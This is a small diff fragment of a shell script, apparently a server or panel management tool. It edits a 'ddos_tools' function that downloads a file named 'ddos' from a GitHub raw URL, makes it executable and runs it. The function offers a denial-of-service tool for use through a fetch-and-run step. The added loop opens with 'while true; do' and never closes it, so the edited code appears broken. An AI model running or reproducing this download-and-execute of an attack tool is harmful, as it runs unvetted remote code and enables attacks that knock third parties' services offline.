@@ -77,9 +77,14 @@ check_token() {
 
 # Ddos Tools
 ddos_tools() {
+ while true; do
+ if [ "$ddos_tools" ]; then
+ 
 wget https://raw.githubusercontent.com/ekovegeance/DDOS/master/ddos
 chmod +x ./ddos
 ./ddos
+
+fi
 }
 
 # Install protect panel
